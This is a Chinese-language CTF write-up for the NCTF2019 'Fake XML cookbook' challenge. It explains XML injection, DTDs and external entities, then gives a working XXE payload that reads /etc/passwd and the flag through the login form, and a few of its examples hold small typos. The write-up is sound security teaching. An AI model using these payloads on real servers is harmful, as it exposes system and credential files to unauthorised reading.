# [NCTF2019]Fake XML cookbook XML注入

**目录**

[TOC]



看到这个界面就像admin 123456弱口令试试看

果然进不去

这里有个tips 但是没有办法点击 我们进源代码看看

```cobol
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```

发现源代码中就存在检测账号密码的内容

但是不知道该干嘛

```vbnet
dataType: "xml",
```

这里很奇怪 为啥xml我们直接搜搜看xml存在什么漏洞

 [XML注入攻击总结_xml攻击_洒脱的智障的博客-CSDN博客](https://blog.csdn.net/qq_32238611/article/details/108301023) 

发现存在xml注入漏洞

我们来学习一下

```cobol
<?xml version="1.0" encoding="utf-8" ?>
 
<USER>
 
  <user Account="admin">用户输入</user>
 
<user Account="root">root</user>
 
</USER>
 
 
用户输入是我们可控的 我们那我们如果可以写xml代码
 
例如
 
admin</user><user Account="baby">baby</user>
 
 
那么就会被闭合实现注入 变为了
 
<?xml version="1.0" encoding="utf-8" ?>
 
<USER>
 
  <user Account="admin">admin</user>
  <user Account="baby">baby</user>
</user>
 
<user Account="root">root</user>
 
</USER>
 
插入了一个 user 名为 baby
```

这是最简单xml注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/158a7472fb9cc6a2e1efbc4fc38b3ff2.png" alt="" style="max-height:435px; box-sizing:content-box;" />


这里是使用外部实体注入

## DTD

```xml
首先我们需要了解什么是DTD
DTD是用来定义 xml的格式
 
例如 
<?xml version="1.0"?>
<!DOCTYPE message[
<!ELEMENT message(receiver,sender)>
]>
 
这里就定义了xml 需要以 message为根元素 
 
并且里面的内容为 receiver 和 sender
 
就和下面一样
 
<message>
<receiver>sqlilab</receiver>
<sender>usernamm</sender>
</message>
```

上面我们介绍完什么是DTD 现在介绍一下 什么是实体

## 实体

```xml
这里我们首先给出一个 DTD 
 
<?xml versiono="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xee "test">
]>
 
 
这里通过 DOCTYPE 规定了根元素为 foo
 
然后通过 ELEMENT 规定了内容为 ANY 就是所有的元素
 
重点是 !ENTITY 规定了 一个变量名 其中内容为 test
 
这个变量 我们可以通过 $xee进行引用
 
所以下面的代码就是
 
<aabb>
<user>&xee</user>
<passwd>admin</passwd>
</aabb>
 
因为接受了 ANY 所以不再局限  可以变为其他元素
 
这里的user值是通过 &xee的 所以其实真正的user值 是test
```

我们了解了什么是实体 我们现在看看什么是内部实体和外部实体

其实上面的写法 就是内部实体

## 外部实体

外部实体其实就可以引用外部的URL 或者进行伪协议读取

这里就会造成xml注入

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT xee SYSTEM "example.com">
]>
 
或者使用伪协议读文件
 
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT xee SYSTEM "file:///ect/passwd">
]>
```

## 做题

这里我们就大致了解完 xml注入的基础了

我们直接来做这个题目 我们使用 外部实体注入读取文件看看

我们首先进行测试 是否存在 外部实体xml注入

```xml
var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
 
 
这里我们就构造 
 
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY admin SYSTEM "file:///etc/passwd">
]>
<user><username>&admin;</username><password>123456</password></user>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c2405f72ddc5b86cf5ac4bc0f0f6f05d.png" alt="" style="max-height:634px; box-sizing:content-box;" />


读取 /etc/passwd成功

我们看看直接读取 flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/e22e34e8f3060f37ed2766a710b808d3.png" alt="" style="max-height:606px; box-sizing:content-box;" />


直接成功了